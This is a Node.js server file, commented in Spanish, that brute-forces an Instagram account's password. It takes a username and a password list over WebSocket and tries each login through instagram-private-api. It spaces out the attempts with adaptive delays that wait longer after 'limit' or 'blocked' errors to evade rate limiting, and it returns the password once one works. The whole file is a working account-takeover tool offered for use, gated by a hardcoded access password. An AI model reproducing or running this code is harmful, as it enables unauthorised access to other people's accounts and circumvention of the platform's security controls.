const WebSocket = require('ws');
const express = require('express');
const { IgApiClient } = require('instagram-private-api');
require('dotenv').config();

const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

// Configuración
const CONFIG = {
  ACCESS_PASSWORD: process.env.ACCESS_PASSWORD || 'error404notfoundÑ',
  DELAY_NORMAL: 1500,
  DELAY_AFTER_FAIL: 3000,
  DELAY_CRITICAL: 10000,
  BATCH_SIZE: 3,
  PORT: process.env.PORT || 8080
};

// Función de delay
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Delay adaptable
const smartDelay = (lastError) => {
  if (!lastError) return delay(CONFIG.DELAY_NORMAL);
  if (lastError.includes('limit') || lastError.includes('blocked')) {
    return delay(CONFIG.DELAY_CRITICAL);
  }
  return delay(CONFIG.DELAY_AFTER_FAIL);
};

// Procesamiento por lotes
async function processBatch(username, passwords) {
  const ig = new IgApiClient();
  ig.state.generateDevice(username);
  
  let lastError = null;
  
  for (const password of passwords) {
    try {
      await ig.simulate.preLoginFlow();
      await delay(500);
      
      const auth = await ig.account.login(username, password);
      
      if (auth.status === 'ok') {
        return { success: true, password };
      }
    } catch (error) {
      lastError = error.message;
      
      if (error.message.includes('challenge_required')) {
        return { success: false, message: 'Desafío de seguridad detectado. Se requiere verificación manual.' };
      }
    } finally {
      await smartDelay(lastError);
    }
  }
  return { success: false };
}

// Servir archivos estáticos
app.use(express.static('public'));

// WebSocket
wss.on('connection', (ws) => {
  console.log('Nueva conexión WebSocket');

  ws.on('message', async (message) => {
    const data = JSON.parse(message);
    
    // Verificar contraseña de acceso
    if (data.type === 'verifyAccessPassword') {
      if (data.password === CONFIG.ACCESS_PASSWORD) {
        ws.send(JSON.stringify({ type: 'accessGranted' }));
      } else {
        ws.send(JSON.stringify({ 
          type: 'accessDenied', 
          message: 'Contraseña de acceso incorrecta' 
        }));
      }
      return;
    }
    
    // Procesar inicio de sesión
    if (data.type === 'startLogin') {
      const { username, passwords } = data;
      const total = passwords.length;
      
      for (let i = 0; i < total; i += CONFIG.BATCH_SIZE) {
        const batch = passwords.slice(i, i + CONFIG.BATCH_SIZE);
        const result = await processBatch(username, batch);
        
        ws.send(JSON.stringify({
          progress: { current: Math.min(i + CONFIG.BATCH_SIZE, total), total },
          ...result
        }));
        
        if (result.success) {
          return ws.send(JSON.stringify({ 
            type: 'finished',
            success: true,
            message: `¡Éxito! Contraseña encontrada: ${result.password}`,
            password: result.password
          }));
        }
      }
      
      ws.send(JSON.stringify({ 
        type: 'finished',
        success: false,
        message: 'No se encontró la contraseña en la lista proporcionada'
      }));
    }
  });
});

server.listen(CONFIG.PORT, () => {
  console.log(`Servidor iniciado en http://localhost:${CONFIG.PORT}`);
});
